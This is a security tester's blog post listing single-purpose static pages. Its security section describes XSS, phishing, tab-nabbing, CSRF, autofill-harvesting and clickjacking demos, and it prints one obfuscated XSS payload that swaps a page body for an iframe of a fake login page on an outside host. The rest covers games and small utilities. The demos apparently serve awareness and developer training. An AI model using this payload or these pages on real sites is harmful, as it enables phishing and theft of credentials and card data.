---
title: "Useful static apps! (Updated)"
date: 2020-08-01T20:15:45+10:00
draft: false
---

Sometimes i make static pages for single purpose and they can be quite useful so i will just leave them here

### For security

Here  is a simple page to show case some useful Content Security Policy (CSP) tricks for protecting apps from XSS [https://cspdemo.surge.sh/](https://cspdemo.surge.sh/). I find sharing this page and some explanation get buy in from developers a lot quicker.

Here is my example to show why it is a good idea to host user's provided content, especially ones where user has full control over, SSRF/proxied-pages in a completely separated domain. Google is no exception: [http://webcache.googleusercontent.com/search?q=cache:https://cornmbank.com](http://webcache.googleusercontent.com/search?q=cache:https://cornmbank.com). This way cross origin policy will protect your web app from being attacked with XSS style attack.

Here is a fun XSS trick i had... This is useful when you notice your variable being injected/server-side render straight into an inline script code block [https://htmlweird.surge.sh/](https://htmlweird.surge.sh/). This trick mess with how browser first parse HTML document to figure out different HTML tags and not having any context about Javascript.

A fun fake login page: [https://cornmbank.com/fakelogin.html](https://cornmbank.com/fakelogin.html) you can either iframe it 
This is example to rewrite the html body and change it to our fakelogin page:
```
<img src=x onerror=eval(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IjxpZnJhbWUgc3JjPVwiaHR0cHM6Ly9lYmZlLnB3L3NoYXJlZC9mYWtlbG9naW4uaHRtbFwiIHN0eWxlPVwid2lkdGg6MTAwJTsgaGVpZ2h0OjEwMHZoXCIgLz4i'))>
```

QRCode generator using js library https://ebfe.pw/shared/qr.html

My phishing page to show case IDN homograph attack: [https://cornmbank.com/](https://cornmbank.com/), it used to get internal ip ranges using webrtc but that seems to be broken nowand it uses a nice trick at the bottom to determine what social network you are logging into.

Open blank-Changing parent tab <-- does what it says:
[https://ebfe.pw/shared/changeparent.html](https://ebfe.pw/shared/changeparent.html)

```
<a href="https://ebfe.pw/shared/changeparent.html" target="_blank">https://ebfe.pw/shared/changeparent.html</a>
```

CSRF test page generates a csrf form submit page base off your "copy as curl command" from burp. Although under engagementtool you do have a generate cfrf PoC page anyway. :p Oh well, whateva [https://ebfe.pw/shared/csrfpage.html](https://ebfe.pw/shared/csrfpage.html)


Pikachu is a static page that would try to steal your autofill info. put ?debug=true at the end of the url to see how it work or ?cc=true and see if it can steal creditcard autofil stuffs
[http://ebfe.pw/shared/pikachu.html](http://ebfe.pw/shared/pikachu.html). Unfortunately chrome has made it more obvious by showing the drop down selection for autofill values.

This page used to clickjack your browser and make your facebook like a page about picklecat :)
[http://www.cornmbank.com/picklecat.html](http://www.cornmbank.com/picklecat.html). Unfortunately my picklecat page was removed and with the Chrome fix for SameSite, this may not be a problem sooner or later. That said, you could potentially modify the source to make an useful demo.


### Games for kids and adults =))

A cardgenerator app i made to create printable A4 pages of card game for security training (for the best experience, use cardstock paper): [https://cardgenerator.surge.sh/](https://cardgenerator.surge.sh/)

Same concept as above, i made a flashcard generator for my wife to use to teach childcare kids: [http://new-motion.surge.sh/](http://new-motion.surge.sh/)


StarRealm deck building game simple point counter [https://ebfe.pw/shared/star.html](https://ebfe.pw/shared/star.html)


Arm wrestling bible (Made after I lost at arm wrestling to a much bigger dude) [https://ebfe.pw/shared/wrestling.html](https://ebfe.pw/shared/wrestling.html)

A hangman game for kindies kid... with image hint after 6 wrong pick [https://wordplay.surge.sh](https://wordplay.surge.sh) - Although perhaps it is not suitable for children since it is..."hang man" ...

A text-to-speech scenario game for kids: [https://tinyadventure.surge.sh](https://tinyadventure.surge.sh). The idea is to act it out and follow the narative for each scenario.

### Randoms


Code Highlight using JS that you can use to copy to word document: [https://ebfe.pw/shared/highlight.html](https://ebfe.pw/shared/highlight.html)

QRCode generator using js library [https://ebfe.pw/shared/qr.html](https://ebfe.pw/shared/qr.html)

A cidr calculator page that include calculation for terraform cidrsubnet() function. [https://ebfe.pw/shared/highlight.html](https://ebfe.pw/shared/highlight.html)
